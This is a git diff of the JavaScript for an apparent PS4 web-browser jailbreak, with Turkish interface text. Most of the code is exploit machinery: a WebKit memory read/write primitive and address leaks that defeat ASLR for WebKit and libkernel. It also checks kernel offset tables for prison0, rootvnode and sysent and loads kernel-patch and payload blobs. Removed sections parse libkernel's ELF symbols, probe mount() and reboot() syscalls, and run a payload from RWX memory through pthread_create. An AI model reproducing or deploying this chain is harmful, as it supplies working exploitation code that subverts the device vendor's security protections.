@@ -1,35 +1,23 @@
-import { establishPrimitive } from "./core.js?v=28";
+import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
-import { offsetsFor, PS4 } from "./ps4_offsets.js?v=5";
+import { offsetsFor } from "./ps4_offsets.js";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
 const lines = [];
 let passCount = 0,
   failCount = 0;
-let armedEver = false;
 const params = new URLSearchParams(location.search);
-const RUN_ID = Date.now().toString(36) + "-" + Math.floor(Math.random() * 0x100000).toString(16);
-const PROBE_MODE = params.get("probe") === "1";
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
-let primitiveReady = false;
 
-function post(tag, detail, synchronous = false) {
-  /* HX1400_POST_DISABLED */
-  if (params.get("hx1400") === "1" && params.get("telemetry") !== "1") {
-    return;
-  }
-  if (params.get("hx1400") === "1" && !primitiveReady && !synchronous) {
-    return;
-  }
-
+function post(tag, detail) {
   try {
     const x = new XMLHttpRequest();
-    x.open("POST", "/t", !synchronous);
+    x.open("POST", "/t", true);
     x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     x.send(
-      "PS4-JB&run=" + encodeURIComponent(RUN_ID) + "&tag=" +
+      "PS4-JB&tag=" +
         encodeURIComponent(tag) +
         "&detail=" +
         encodeURIComponent(String(detail == null ? "" : detail)),
@@ -60,154 +48,49 @@ function terse(s) {
 }
 
 const SHOW_LOG = params.get("log") === "1";
-
-/* UPDATE_RAM_BOX */
-const ramBox =
-  document.getElementById("ramBox");
-
-function formatMB(bytes) {
-  bytes = Number(bytes || 0);
-
-  if (bytes <= 0) {
-    return "0MB";
-  }
-
-  return (
-    (bytes / (1024 * 1024)).toFixed(2) +
-    "MB"
-  );
-}
-
-function updateRamBox() {
-  if (!ramBox) {
-    return;
-  }
-
-  let heapText =
-    "JS belleği: bilgi yok";
-
-  try {
-    if (
-      performance &&
-      performance.memory
-    ) {
-      const used =
-        Number(
-          performance.memory.usedJSHeapSize || 0,
-        );
-
-      const limit =
-        Number(
-          performance.memory.jsHeapSizeLimit || 0,
-        );
-
-      if (limit > 0) {
-        const percent =
-          used / limit * 100;
-
-        heapText =
-          "JS belleği: " +
-          percent.toFixed(1) +
-          "% (" +
-          formatMB(used) +
-          "/" +
-          formatMB(limit) +
-          ")";
-      } else {
-        heapText =
-          "JS belleği: " +
-          formatMB(used);
-      }
-    }
-  } catch (ramError) {
-    heapText =
-      "JS belleği: hata";
-  }
-
-  let coreText =
-    "Çekirdek: bilgi yok";
-
-  try {
-    const info =
-      globalThis.__CORE_MEM_INFO;
-
-    if (info) {
-      coreText =
-        "Çekirdek: slots=" +
-        info.slots +
-        " drain=" +
-        info.drainCount +
-        "x" +
-        formatMB(info.drainSize) +
-        " est=" +
-        formatMB(info.estimatedBytes) +
-        " mem=" +
-        info.memLevel;
-    }
-  } catch (coreError) {
-    coreText =
-      "Çekirdek: hata";
-  }
-
-  ramBox.textContent =
-    heapText + " | " + coreText;
-}
-
-if (ramBox) {
-  updateRamBox();
-
-  setInterval(
-    updateRamBox,
-    500,
-  );
-}
-
 if (SHOW_LOG && document.body) document.body.className = "log";
-let finalUIResult = null;
 function finishUI(ok) {
-  finalUIResult = ok;
   if (SHOW_LOG || !document.body) return;
-  const m = document.getElementById("msg");
-  if (m)
-    m.textContent = ok
-      ? "İŞLEM TAMAMLANDI"
-      : armedEver
-        ? "Konsolunuzu yeniden başlatın"
-        : "Sayfayı yenileyip tekrar deneyin";
   document.body.className = ok ? "done" : "fail";
+  try {
+    const spin = document.getElementById("spin");
+    const title = document.querySelector(".main-title");
+    const hint = document.querySelector(".hint");
+    const steps = document.querySelector(".steps");
+    const button = document.getElementById("startJb");
+    if (spin) spin.style.display = "none";
+    if (title) title.style.display = "none";
+    if (hint) hint.style.display = "none";
+    if (steps) steps.style.display = "none";
+    if (button) button.style.display = "none";
+  } catch (e) {}
 }
-function mark(tag, detail, synchronous = false) {
+function mark(tag, detail) {
   const raw = detail;
   detail = terse(detail);
-
-  lines.push(
-    tag +
-    (
-      detail == null || detail === ""
-        ? ""
-        : "  " + detail
-    ),
-  );
-
-  if (lines.length > 600) {
-    lines.splice(
-      0,
-      lines.length - 600,
-    );
-  }
-
+  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
   if (SHOW_LOG && outEl) {
-    outEl.textContent =
-      lines.join("\n");
-
-    outEl.scrollTop =
-      outEl.scrollHeight;
+    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
+    outEl.innerHTML = lines
+      .map(function (l) {
+        l = esc(l);
+        const c =
+          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(
+            l,
+          )
+            ? "bad"
+            : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l)
+              ? "warn"
+              : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l)
+                ? "ok"
+                : "";
+        return c ? '<span class="' + c + '">' + l + "</span>" : l;
+      })
+      .join("\n");
+    outEl.scrollTop = outEl.scrollHeight;
   }
-
-  post(tag, raw, synchronous);
+  post(tag, raw);
 }
-
-function markSync(tag, detail) { mark(tag, detail, true); }
 
 function trace(tag, detail) {
   if (VERBOSE) mark(tag, detail);
@@ -249,14 +132,10 @@ const SYS = {
   getegid: 43,
   aio_multi_wait: 663,
   aio_multi_cancel: 666,
-    aio_submit_cmd: 669,
-  write: 4,
+  aio_submit_cmd: 669,
   sysctl: 202,
   kill: 37,
   getppid: 39,
-  kqueue: 362,
-  kevent: 363,
-  jitshm_create: 533,
 };
 const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
 const keepAlive = [];
@@ -278,161 +157,20 @@ let allDone = false,
   let closeFd = null;
   try {
     const { key, off } = offsetsFor(navigator.userAgent);
-    mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
     if (!off) {
-      /* NONPS4-DEBUG */
-      try {
-        document.body.classList.add("log");
-      } catch (e) {}
-
-      state("PS4 tarayıcısı değil - hata ayıklama modu", "warn");
-
-      mark(
-        "NONPS4-DEBUG",
-        "ua=" + (navigator.userAgent || "unknown"),
-      );
-
-      try {
-        mark(
-          "NONPS4-OFFSETS",
-          "supported=" + Object.keys(PS4).join(","),
-        );
-      } catch (e) {
-        mark("NONPS4-OFFSETS", "error=" + String(e));
-      }
-
-      try {
-        const off14 = PS4["14.00"];
-
-        if (off14) {
-          mark(
-            "NONPS4-14",
-            "present " +
-            "webkit=" + off14.wk_expm1_builtin +
-            " poprdi=0x" + off14.wk_POP_RDI_RET.toString(16) +
-            " poprsi=0x" + off14.wk_POP_RSI_RET.toString(16) +
-            " poprdx=0x" + off14.wk_POP_RDX_RET.toString(16),
-          );
-        } else {
-          mark("NONPS4-14", "entry=missing");
-        }
-      } catch (e) {
-        mark("NONPS4-14", "error=" + String(e));
-      }
-
-      try {
-        const info = globalThis.__CORE_MEM_INFO;
-
-        if (info) {
-          mark(
-            "NONPS4-CORE",
-            "hx1400=" + info.hx1400 +
-            " memLevel=" + info.memLevel +
-            " slots=" + info.slots +
-            " drain=" + info.drainCount +
-            " est=" + info.estimatedBytes,
-          );
-        } else {
-          mark("NONPS4-CORE", "info=missing");
-        }
-      } catch (e) {
-        mark("NONPS4-CORE", "error=" + String(e));
-      }
-
-      allDone = true;
+      state("no offsets for this firmware", "bad");
       return;
     }
     const fwKey = key || "unknown";
 
-    const PRIMITIVE_ONLY = params.get("stop") === "primitive";
-
-    if (PRIMITIVE_ONLY) {
-      state("WebKit bellek erişimi test ediliyor...", "warn");
-
-      await new Promise(function (resolve) {
-        setTimeout(resolve, 0);
-      });
-
-      const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
-
-      const carrier = await establishPrimitive({
-        maxAttempts: 6,
-        onEvent: function (tag, detail, attempt) {
-          const writer = PRIMITIVE_LOUD.test(tag) ? mark : trace;
-
-          writer(
-            tag,
-            (attempt != null ? "[" + attempt + "] " : "") +
-              (detail || ""),
-          );
-        },
-      });
-
-      installWindowP(carrier, { promote: false });
-
-      const pp = window.p;
-
-      const cell = pp.leakval(Math.expm1);
-
-      const nativeFn = pp.read8(
-        pp.read8(cell.add32(0x18)).add32(
-          off.wk_JSFunction_m_function,
-        ),
-      );
-
-      const webkitBase = nativeFn.sub32(
-        off.wk_expm1_builtin,
-      );
-
-      const aligned = function (value) {
-        return value.hi > 0 && (value.low & 0x3fff) === 0;
-      };
-
-      const primitiveOk = aligned(webkitBase);
-
-      try {
-        const errorFn = pp.read8(
-          webkitBase.add32(off.wk___imp___error),
-        );
-
-        const libkernelBase = errorFn.sub32(
-          off.k__error,
-        );
-
-        mark(
-          "BASES",
-          "webkit=" + webkitBase +
-          " libkernel=" + libkernelBase,
-        );
-      } catch (baseError) {
-        mark(
-          "BASES",
-          "webkit=" + webkitBase +
-          " libkernel=unresolved",
-        );
-      }
-
-      mark(
-        "PRIMITIVE-ONLY",
-        primitiveOk ? "PASS" : "FAIL",
-      );
-
-      allDone = true;
-      finishUI(primitiveOk);
-      return;
-    }
-
-
     const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
     const DO_PAYLOAD = params.get("payload") !== "0";
-    const SKIPJB = params.get("skipjb") !== "0";
 
     const KEEP_JB = params.get("keepjb") === "1";
 
-    const HX1400_MODE = params.get("hx1400") === "1";
-    const NEED_K = HX1400_MODE ? [] : [
+    const NEED_K = [
       "k_idt_rsvd",
       "k_oid_kern_file",
       "k_oid_maxfilesperproc",
@@ -448,7 +186,7 @@ let allDone = false,
     if (
       !check(
         "kernel-table-present",
-        missing.length === 0 || PROBE_MODE,
+        missing.length === 0,
         "fw=" +
           fwKey +
           " missing=[" +
@@ -463,13 +201,13 @@ let allDone = false,
     const KPATCH_FILE =
       "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
     const PAYLOAD_FILE = off.payload || "payload.bin";
-    const needPatch = HX1400_MODE ? [] : ["k_sysent_661", "k_jmp_rsi"].filter(
+    const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
     if (
       !check(
         "kpatch-table-present",
-        !DO_PATCH || PROBE_MODE || needPatch.length === 0,
+        !DO_PATCH || needPatch.length === 0,
         "missing=[" +
           needPatch.join(",") +
           "] blob=" +
@@ -478,13 +216,13 @@ let allDone = false,
       )
     )
       return;
-    const needPl = HX1400_MODE ? [] : ["wk___imp_pthread_create", "k_pthread_create"].filter(
+    const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(
       (k) => off[k] === undefined,
     );
     if (
       !check(
         "payload-table-present",
-        !DO_PAYLOAD || PROBE_MODE || needPl.length === 0,
+        !DO_PAYLOAD || needPl.length === 0,
         "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
       )
     )
@@ -492,29 +230,17 @@ let allDone = false,
     mark("FW-STATUS", off.fw_status || "none");
     mark(
       "FW-KTABLE",
-      "idt_rsvd=" +
-        (
-          off.k_idt_rsvd === undefined
-            ? "undefined"
-            : "0x" + off.k_idt_rsvd.toString(16)
-        ) +
-      " prison0=" +
-        (
-          off.k_prison0 === undefined
-            ? "undefined"
-            : "0x" + off.k_prison0.toString(16)
-        ) +
-      " rootvnode=" +
-        (
-          off.k_rootvnode === undefined
-            ? "undefined"
-            : "0x" + off.k_rootvnode.toString(16)
-        ) +
-      " kpatch=" +
+      "idt_rsvd=0x" +
+        off.k_idt_rsvd.toString(16) +
+        " prison0=0x" +
+        off.k_prison0.toString(16) +
+        " rootvnode=0x" +
+        off.k_rootvnode.toString(16) +
+        " kpatch=" +
         KPATCH_FILE +
-      " payload=" +
+        " payload=" +
         PAYLOAD_FILE +
-      " src=ps4_offsets.js",
+        " src=ps4_offsets.js",
     );
 
     // ---- benign-miss auto-retry (reads only, before any kernel write) ----
@@ -527,13 +253,13 @@ let allDone = false,
     // A hard KP (a total reclaim miss that faults inside the cancel walk)
     // cannot be caught here and still needs a reboot -- this only recovers
     // the benign, detectable misses.
-    const retryArg = parseInt(params.get("retry") || "", 10);
-    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
+    const RETRY_MAX = params.get("retry")
+      ? parseInt(params.get("retry"), 10)
+      : 8;
     const RETRY_KEY = "jb1352-read-retry";
     const retryCount = () => {
       try {
-        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
-        return Number.isFinite(v) && v > 0 ? v : 0;
+        return parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10) || 0;
       } catch (e) {
         return 0;
       }
@@ -547,26 +273,24 @@ let allDone = false,
       const n = retryCount();
       if (n >= RETRY_MAX) {
         mark(
-          "AUTO-RELOAD-GIVEUP",
-          "why=" + why + " reloads=" + n + " -- reboot and try again",
+          "AUTO-RETRY-GIVEUP",
+          "why=" + why + " after " + n + " reloads -- reboot and try again",
         );
         return false;
       }
-      let stored = -1;
       try {
         sessionStorage.setItem(RETRY_KEY, String(n + 1));
-        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
-      } catch (e) {
-        stored = -1;
-      }
-      if (stored !== n + 1) {
-        mark(
-          "AUTO-RELOAD-NO-STORAGE",
-          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
-        );
-        return false;
-      }
-      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
+      } catch (e) {}
+      mark(
+        "AUTO-RETRY",
+        "why=" +
+          why +
+          " reload " +
+          (n + 1) +
+          "/" +
+          RETRY_MAX +
+          " (benign read miss, no kernel write yet)",
+      );
       setTimeout(() => {
         try {
           location.reload();
@@ -575,33 +299,23 @@ let allDone = false,
       return true;
     };
     if (retryCount() > 0)
-      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);
+      mark(
+        "AUTO-RETRY-RESUME",
+        "read-phase retry " + retryCount() + "/" + RETRY_MAX,
+      );
 
-    state("WebKit bellek erişimi hazırlanıyor...", "warn");
+    state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
 
     const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
-    const entryEvents = [];
-    let entryCount = 0;
-    let carrier;
-    try {
-      carrier = await establishPrimitive({
-        maxAttempts: 8,
-        onEvent: (t, d, a) => {
-          entryCount++;
-          entryEvents.push(t + (a == null ? "" : "[" + a + "]"));
-          if (entryEvents.length > 8) entryEvents.shift();
-          (PRIMITIVE_LOUD.test(t) ? mark : trace)(
-            t,
-            (a != null ? "[" + a + "] " : "") + (d || ""),
-          );
-        },
-      });
-    } finally {
-      primitiveReady = true;
-      mark("CORE-ENTRY-SUMMARY", "events=" + entryCount +
-        " last=" + entryEvents.join(","));
-    }
+    const carrier = await establishPrimitive({
+      maxAttempts: 6,
+      onEvent: (t, d, a) =>
+        (PRIMITIVE_LOUD.test(t) ? mark : trace)(
+          t,
+          (a != null ? "[" + a + "] " : "") + (d || ""),
+        ),
+    });
     installWindowP(carrier, { promote: false });
     if (!window.p) throw new Error("window.p was not installed");
     p = window.p;
@@ -621,28 +335,7 @@ let allDone = false,
     );
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
     const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-    let libkernelBase = errorFn.sub32(off.k__error);
-
-    if (HX1400_MODE || PROBE_MODE) {
-      const libkernelAdjust =
-        libkernelBase.low & 0x3fff;
-
-      if (libkernelAdjust !== 0) {
-        libkernelBase =
-          libkernelBase.sub32(
-            libkernelAdjust,
-          );
-
-        mark(
-          "HX1400-LIBKERNEL-ALIGN",
-          "adjust=0x" +
-          libkernelAdjust.toString(16) +
-          " base=" +
-          libkernelBase,
-        );
-      }
-    }
-
+    const libkernelBase = errorFn.sub32(off.k__error);
     mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
     const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
     if (
@@ -747,122 +440,6 @@ let allDone = false,
     if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
       return;
 
-    if (PROBE_MODE) {
-      const rd4 = (a) => p.read4(a) >>> 0;
-      const B = libkernelBase;
-      const symHash = (name) => {
-        let h = 0;
-        for (let i = 0; i < name.length; i++)
-          h = (h << 4) + name.charCodeAt(i);
-        const g = h & 0xf0000000;
-        if (g) h ^= g >>> 24;
-        return (h & ~g) >>> 0;
-      };
-      const cstrAt = (addr) => {
-        let out = "";
-        for (let i = 0; i < 64; i++) {
-          const b = p.read1(addr.add32(i));
-          if (b === 0) break;
-          out += String.fromCharCode(b);
-        }
-        return out;
-      };
-      const phoff = p.read8(B.add32(0x20));
-      const phentsize = rd4(B.add32(0x36)) & 0xffff;
-      const phnum = rd4(B.add32(0x38)) & 0xffff;
-      let dynV = null;
-      for (let k = 0; k < phnum; k++) {
-        const ph = B.add32(phoff).add32(k * phentsize);
-        if (rd4(ph) === 2) {
-          dynV = p.read8(ph.add32(0x10));
-          break;
-        }
-      }
-      let strV = null,
-        symV = null,
-        hashV = null,
-        symEnt = 24;
-      if (dynV) {
-        for (let k = 0; k < 4096; k++) {
-          const tag = p.read8(dynV.add32(k * 16));
-          const val = p.read8(dynV.add32(k * 16 + 8));
-          if (tag.low === 0 && tag.hi === 0) break;
-          if (tag.low === 5) strV = val;
-          else if (tag.low === 6) symV = val;
-          else if (tag.low === 4) hashV = val;
-          else if (tag.low === 11) symEnt = val.low >>> 0;
-        }
-      }
-      check(
-        "elf-dynamic-parsed",
-        !!dynV && !!strV && !!symV && !!hashV,
-        "dyn=" + dynV + " strtab=" + strV + " symtab=" + symV + " hash=" + hashV,
-      );
-      let mountStub = null,
-        mountNum = -1;
-      if (dynV && strV && symV && hashV) {
-        const nbucket = rd4(B.add32(hashV));
-        const h = symHash("mount");
-        let idx = rd4(B.add32(hashV).add32(8 + (h % nbucket) * 4));
-        let guard = 0;
-        while (idx !== 0 && guard++ < 4096) {
-          const sym = B.add32(symV).add32(idx * symEnt);
-          if (cstrAt(B.add32(strV).add32(rd4(sym))) === "mount") {
-            mountStub = B.add32(p.read8(sym.add32(8)));
-            const sv = p.read8(mountStub);
-            if ((sv.low & 0x00ffffff) === 0xc0c748 && sv.hi >>> 24 === 0x49)
-              mountNum =
-                ((sv.low >>> 24) | ((sv.hi & 0x00ffffff) << 8)) >>> 0;
-            break;
-          }
-          idx = rd4(B.add32(hashV).add32(8 + nbucket * 4 + idx * 4));
-        }
-      }
-      check(
-        "mount-sym-found",
-        !!mountStub,
-        mountStub
-          ? "stub=" + mountStub + " syscall=" + mountNum
-          : "mount NOT exported by libkernel .dynsym",
-      );
-      if (mountStub && mountNum >= 0) {
-        const strBuf = (txt) => {
-          const ab = new ArrayBuffer(txt.length + 1);
-          keepAlive.push(ab);
-          const u8 = new Uint8Array(ab);
-          for (let i = 0; i < txt.length; i++) u8[i] = txt.charCodeAt(i);
-          u8[txt.length] = 0;
-          return ab;
-        };
-        const typeAb = strBuf("ufs");
-        const dirAb = strBuf("/mnt/usb0");
-        const specAb = strBuf("/dev/da0s1");
-        const argsAb = new ArrayBuffer(0x20);
-        keepAlive.push(argsAb);
-        put(new DataView(argsAb), 0x00, bufAddr(specAb));
-        const mrv = callAddr(mountStub, [
-          bufAddr(typeAb),
-          bufAddr(dirAb),
-          1,
-          bufAddr(argsAb),
-        ]).i32;
-        const merr = mrv !== 0 ? errno() : 0;
-        mark(
-          "PROBE-MOUNT",
-          "mount(syscall=" +
-            mountNum +
-            ",ufs,/mnt/usb0,RDONLY,/dev/da0s1) rv=" +
-            mrv +
-            " errno=" +
-            merr +
-            " (2=ENOENT-no-usb 1=EPERM-sandbox 0=mounted?!)",
-        );
-      }
-      mark("PROBE-DONE", "mount reachability probed; stopping");
-      return;
-    }
-
-
     function bufAddr(ab) {
       const c = p.leakval(ab);
       return p.read8(
@@ -965,353 +542,12 @@ let allDone = false,
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
-    function dynsymLookup(name) {
-      const B = libkernelBase;
-      const rd4 = (a) => p.read4(a) >>> 0;
-      const rd8 = (a) => p.read8(a);
-      if (!globalThis.__elf) {
-        const phoff = rd8(B.add32(0x20));
-        const phentsize = rd4(B.add32(0x36)) & 0xffff;
-        const phnum = rd4(B.add32(0x38)) & 0xffff;
-        let dynV = null;
-        for (let k = 0; k < phnum; k++) {
-          const ph = B.add32(phoff).add32(k * phentsize);
-          if (rd4(ph) === 2) { dynV = rd8(ph.add32(0x10)); break; }
-        }
-        let strV = null, symV = null, hashV = null, symEnt = 24;
-        for (let k = 0; k < 4096; k++) {
-          const tag = rd8(dynV.add32(k * 16));
-          const val = rd8(dynV.add32(k * 16 + 8));
-          if (tag.hi === 0 && tag.low === 0) break;
-          if (tag.low === 5) strV = val;
-          else if (tag.low === 6) symV = val;
-          else if (tag.low === 4) hashV = val;
-          else if (tag.low === 11) symEnt = val.low >>> 0;
-        }
-        globalThis.__elf = { strV, symV, hashV, symEnt };
-      }
-      const E = globalThis.__elf;
-      let h = 0;
-      for (let i = 0; i < name.length; i++) h = (h << 4) + name.charCodeAt(i);
-      const g = h & 0xf0000000;
-      if (g) h ^= g >>> 24;
-      h &= ~g;
-      const B2 = libkernelBase;
-      const nb = (a) => (p.read4(a) >>> 0);
-      const nbucket = nb(B2.add32(E.hashV));
-      let idx = nb(B2.add32(E.hashV).add32(8 + (h % nbucket) * 4));
-      let guard = 0;
-      while (idx !== 0 && guard++ < 4096) {
-        const sym = B2.add32(E.symV).add32(idx * E.symEnt);
-        const nameOff = nb(sym);
-        let s = "";
-        for (let i = 0; i < 64; i++) {
-          const ch = p.read1(B2.add32(E.strV).add32(nameOff + i));
-          if (ch === 0) break;
-          s += String.fromCharCode(ch);
-        }
-        if (s === name) return B2.add32(p.read8(sym.add32(8)));
-        idx = nb(B2.add32(E.hashV).add32(8 + nbucket * 4 + idx * 4));
-      }
-      return null;
-    }
-    function bigRed(msg) {
-      try {
-        let d = document.getElementById("bigred");
-        if (!d) {
-          d = document.createElement("div");
-          d.id = "bigred";
-                        d.style.cssText =
-            "position:fixed;left:0;top:0;width:100%;height:100%;background:#000;color:#ff2222;" +
-            "z-index:999999;font-size:26px;font-weight:bold;text-align:center;" +
-            "padding-top:38%;font-family:sans-serif;white-space:pre-wrap;line-height:1.4;";
-          document.body.appendChild(d);
-        }
-        d.textContent = msg;
-      } catch (e) {}
-    }
-    let restartAdvised = false;
-    async function adviseRestart(why) {
-      if (restartAdvised) return;
-      restartAdvised = true;
-            mark(
-        "RESTART-NEEDED",
-        why + " -- FULL power off the console (not Rest Mode), then power on",
-      );
-      bigRed("YENİDEN BAŞLATMA GEREKİYOR\n\n" + why + "\n\nKonsolu tamamen kapatın (Dinlenme Modu değil), ardından açın");
-      try {
-        if (!p || !callAddr || !libkernelBase) {
-          mark("RESTART-MANUAL", "no memory primitive - reboot by hand");
-          return;
-        }
-        const rb = dynsymLookup("reboot");
-        if (!rb) {
-          mark("RESTART-MANUAL", "reboot not exported by libkernel - reboot by hand");
-          return;
-        }
-        mark("RESTART-AUTO", "trying reboot() via " + rb);
-        const rv = callAddr(rb, [0, 0]).i32;
-        mark(
-          "RESTART-AUTO",
-          "reboot() returned " + rv + " (sandbox blocked it) - reboot by hand",
-        );
-      } catch (e) {
-        mark("RESTART-MANUAL", "auto-reboot failed: " + (e && e.message) + " - reboot by hand");
-      }
-    }
-
-    async function relaunchPayload() {
-      let blob = null;
-      try {
-        const r = await fetch(PAYLOAD_FILE);
-        if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
-      } catch (e) {}
-      if (!blob || blob[0] !== 0xe9) {
-        mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
-        return;
-      }
-      const sz = (blob.length + 0x3fff) & ~0x3fff;
-      const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
-      const entry = new int64(m.lo, m.hi);
-      if (m.i32 === -1 || entry.hi >>> 0 === 0) {
-        mark("JB-RELAUNCH", "mmap failed err=" + errno());
-        return;
-      }
-      for (let o = 0; o < blob.length; o += 8) {
-        let lo = 0,
-          hi = 0;
-        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
-      }
-      let bad = -1;
-      for (let o = 0; o < blob.length && bad < 0; o++)
-        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
-      if (bad >= 0) {
-        mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
-        return;
-      }
-      const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
-      const expect = libkernelBase.add32(off.k_pthread_create);
-      if (fn.low !== expect.low || fn.hi !== expect.hi) {
-        mark("JB-RELAUNCH", "pthread_create got=" + fn + " want=" + expect);
-        return;
-      }
-      const thr = new ArrayBuffer(8);
-      keepAlive.push(thr);
-      new Uint8Array(thr).fill(0);
-      const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
-      const tdv = new DataView(thr);
-      const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
-      payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
-      check(
-        "JB-RELAUNCH",
-        payloadRunning,
-        "file=" +
-          PAYLOAD_FILE +
-          " bytes=" +
-          blob.length +
-          " pthread_create=" +
-          rc +
-          " handle=" +
-          handle,
-      );
-    }
-
-    
-    if (params.get("mini_only") === "1") {
-      try {
-        const mini = await import("./hx_kevent.js?v=stage10s-1");
-        const ok = await mini.runMini({
-          p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
-          webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
-          stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
-          mark: mark, markSync: markSync, trace: trace, state: state, check: check,
-          fetchFile: async function (path) {
-            const response = await fetch(path);
-            if (!response.ok) throw new Error(path + " HTTP " + response.status);
-            return new Uint8Array(await response.arrayBuffer());
-          },
-        });
-        mark("MINI-FINAL", "executed_and_readback=" + ok);
-        allDone = true;
-        finishUI(ok === true);
-        return;
-      } catch (e) {
-        mark("MINI-ERROR", String(e));
-        allDone = true;
-        finishUI(false);
-        return;
-      }
-    }
-
-    if (params.get("hx1400") === "1") {
-      try {
-        const hx = await import("./hx1400_port.js?v=stage10s-1");
-        if (!hx || typeof hx.runHx1400 !== "function") {
-          mark(
-            "HX1400-BAD-MODULE",
-            "runHx1400 missing - stale cached module? bump v and hard reload",
-          );
-          allDone = true;
-          finishUI(false);
-          return;
-        }
-
-        if (params.get("kv") === "1") {
-          mark("KV-START", "entering kv path");
-          try {
-            await hx.runHx1400({
-              p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
-              webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
-              stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
-              mark: mark, trace: trace, state: state, check: check,
-              fetchFile: async function (path) {
-                const response = await fetch(path);
-                if (!response.ok) throw new Error(path + " HTTP " + response.status);
-                return new Uint8Array(await response.arrayBuffer());
-              },
-            });
-            if (!globalThis.__HX_KBASE) {
-              let kn = 0;
-              try { kn = parseInt(sessionStorage.getItem("kv-kbase-retry") || "0", 10) || 0; } catch (e) {}
-              if (kn < 2) {
-                try { sessionStorage.setItem("kv-kbase-retry", String(kn + 1)); } catch (e) {}
-                mark("KV-RETRY", "route-leak found no kernel pointers; page reload " + (kn + 1) + "/2 -- if it keeps failing, FULL power off the console");
-                setTimeout(() => { try { location.reload(); } catch (e) {} }, 600);
-                return;
-              }
-              try { sessionStorage.removeItem("kv-kbase-retry"); } catch (e) {}
-                     bigRed("YENİDEN BAŞLATMA GEREKİYOR\n\nKernel adresi bulunamadı.\nKonsolu tamamen kapatıp yeniden açın (Dinlenme Modu değil),\nardından tekrar deneyin.");
-              allDone = true;
-              finishUI(false);
-              return;
-            }
-            try { sessionStorage.removeItem("kv-kbase-retry"); } catch (e) {}
-            const kvb = await import("./hx_kevent.js?v=stage10s-1");
-            const kvOk = await kvb.runKevent({
-              p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
-              webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
-              stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
-              mark: mark, markSync: markSync, trace: trace, state: state, check: check,
-              fetchFile: async function (path) {
-                const response = await fetch(path);
-                if (!response.ok) throw new Error(path + " HTTP " + response.status);
-                return new Uint8Array(await response.arrayBuffer());
-              },
-              kbase: globalThis.__HX_KBASE,
-            });
-            allDone = true;
-            finishUI(kvOk === true);
-            return;
-          } catch (kvError) {
-            mark(
-              "KV-THREW",
-              (kvError && kvError.message ? kvError.message : String(kvError)) +
-                " :: " +
-                (kvError && kvError.stack ? String(kvError.stack).slice(0, 400) : "no-stack"),
-            );
-            allDone = true;
-            return;
-          }
-        }
-        const hxOk = await hx.runHx1400({
-          p: p,
-          sc: sc,
-          callAddr: callAddr,
-          bufAddr: bufAddr,
-          errno: errno,
-          webkitBase: webkitBase,
-          libkernelBase: libkernelBase,
-          G: G,
-          stubAddr: stubAddr,
-          int64: int64,
-          params: params,
-          keepAlive: keepAlive,
-          mark: mark,
-          trace: trace,
-          state: state,
-          check: check,
-          fetchFile: async function (path) {
-            const response = await fetch(path);
-
-            if (!response.ok) {
-              throw new Error(
